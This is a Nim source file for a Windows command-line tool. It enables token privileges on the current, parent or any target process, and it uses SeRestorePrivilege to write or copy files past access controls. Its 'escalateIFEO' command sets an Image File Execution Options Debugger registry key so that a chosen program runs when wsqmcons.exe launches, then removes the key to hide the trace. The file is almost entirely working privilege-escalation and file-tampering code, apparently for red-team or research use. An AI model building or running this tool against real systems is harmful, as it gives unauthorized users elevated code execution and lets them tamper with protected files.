import cligen
import winim

proc raiseException(description: string) = 
  raise newException(OSError, description & " Errcode: " & $GetLastError())

proc setPrivilege(hToken: HANDLE, privilege: string, bEnablePrivilege = true): bool =
  var
    tp: TOKEN_PRIVILEGES
    luid: LUID

  if bEnablePrivilege:
    echo "Enabling " & privilege & " privilege..."
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  else:
    echo "Disabling " & privilege & " privilege..."
    tp.Privileges[0].Attributes = 0

  let pval = LookupPrivilegeValue(NULL, privilege.LPCTSTR, &luid)
  if pval < 0: raiseException("Privilege lookup failed.")

  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid

  if (AdjustTokenPrivileges(hToken, FALSE, addr tp, (sizeof(TOKEN_PRIVILEGES)).DWORD, cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL)) < 0):
    raiseException("Adjusting token failed.")

  if (GetLastError() == ERROR_NOT_ALL_ASSIGNED):
    raiseException("Privilege not held by the process. Not elevated?")

  return true

proc getProcToken(pid: int): HANDLE =
  var
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid.DWORD)
    hToken: HANDLE
  if (hProcess < 0): raiseException("OpenProcess() failed.")
  if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hToken) < 0):
    raiseException("OpenProcessToken() failed.")
  return hToken

proc getParentPID(): int =
  let pid = GetCurrentProcessId()
  var
    pe: PROCESSENTRY32
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    
  pe.dwSize = (sizeof pe).DWORD
  if (Process32First(h, addr pe) >= 0):
    while (Process32Next(h, addr pe) >= 0):
      if (pe.th32ProcessID == pid):
        result = pe.th32ParentProcessID
        break
  CloseHandle(h)

proc restoreFile(filename: string, pBuf: ptr char, buflen: int): bool =
  var 
    dHandle: HANDLE
    destFile = filename.LPCWSTR
    bytesWritten: DWORD

  dHandle = CreateFileW(
    destFile,
    GENERIC_WRITE,
    FILE_SHARE_WRITE,
    NULL,
    CREATE_ALWAYS,
    FILE_FLAG_BACKUP_SEMANTICS,
    cast[HANDLE](NULL)
  )
  if (dHandle == INVALID_HANDLE_VALUE):
    raiseException("Unable to obtain file handle.")
    return false

  WriteFile(
    dHandle,
    pBuf,
    buflen.DWORD,
    addr bytesWritten,
    NULL
  )
  CloseHandle(dHandle)

  return true

proc createIFEOKey(exe_name = "wsqmcons.exe", debugger: string): bool =
  let lpSubkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & exe_name
  var handle: HKEY
  var status = RegCreateKeyExA(
    HKEY_LOCAL_MACHINE, 
    lpSubkey,
    0,
    NULL,
    REG_OPTION_BACKUP_RESTORE,
    KEY_SET_VALUE,
    NULL,
    addr handle,
    NULL
  )
  if status != ERROR_SUCCESS:
    raiseException("Unable to obtain key handle.")
    return false
  else:
    echo "Registry key handle obtained. Subkey: " & lpSubkey

  var data = debugger.mstring

  status = RegSetValueExA(
    handle, 
    "Debugger", 
    0, 
    REG_SZ, 
    cast[PBYTE](addr data), 
    (debugger.len + 1).DWORD
  )
  
  if status != ERROR_SUCCESS:
    raiseException("Unable to set the key value.")
    return false
  else:
    echo "Registry key set."

proc deleteIFEOKey*(exe_name = "wsqmcons.exe"): bool =
  let regval = (r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & exe_name).LPCSTR
  return RegDeleteKeyA(HKEY_LOCAL_MACHINE, regval) == ERROR_SUCCESS

proc adjust(pid: int, enable=true, privilege: seq[string]) = 
  var hToken = getProcToken(pid)
  for p in privilege: discard setPrivilege(hToken, p, enable)

proc adjustParent(enable=true, privilege: seq[string]) = 
  adjust(getParentPID(), enable, privilege)

proc adjustSelf(privilege: seq[string], enable=true) = 
  adjust(GetCurrentProcessId().int, enable, privilege)
    
proc escalateIFEO(filename = "wsqmcons.exe", debugger: string) =
  adjustSelf @["SeRestorePrivilege"]

  if createIFEOKey(filename, debugger):
    echo "Registry key created."

  if deleteIFEOKey(filename):
    echo "Registry cleaned up..."

proc fileWrite(filename: string, content: string = "") =
  adjustSelf @["SeRestorePrivilege"]
  var  pBuf = winstrConverterStringToPtrChar(content)
  if restoreFile(filename, pBuf, content.len):
    echo "File created: " & filename

proc fileCopy(source, destination: string) =
  adjustSelf @["SeRestorePrivilege"]
  var f_src: File
  if not open(f_src, source):
    raise newException(OSError, "Unable to open " & source)
  var buffer = newSeq[char](getFileSize(f_src))
  let bytes_read = readBuffer(f_src, addr buffer[0], buffer.len)
  close(f_src)
  if restoreFile(destination, buffer[0].addr, buffer.len):
    echo "Copied " & source & " to: " & destination & " (" & $bytes_read & " bytes)."


when isMainModule:
  dispatchMulti(
    [
      adjust, 
      help = { "pid": "target process id"}, 
      short = { "privilege": 's' },
      doc = "Adjust arbitrary process privileges"
    ], 
    [
      adjustParent, 
      short = { "privilege": 's' },
      doc = "Adjust parent process privileges"
    ],
    [
      escalateIFEO, 
      help = { "filename": "filename abc", "debugger": "filename to run upon execution"},
      doc = "Create Image File Execution Options registry key, trigger execution and remove the key."
    ],
    [
      fileWrite,
      short = { "filename": 'f', "content": 'c' },
      doc = "Create a file using SeRestorePrivileges with optional content."
    ],
    [
      fileCopy,
      short = { "source": 's', "destination": 'd' },
      doc = "Copy file using SeRestorePrivileges."
    ]
  )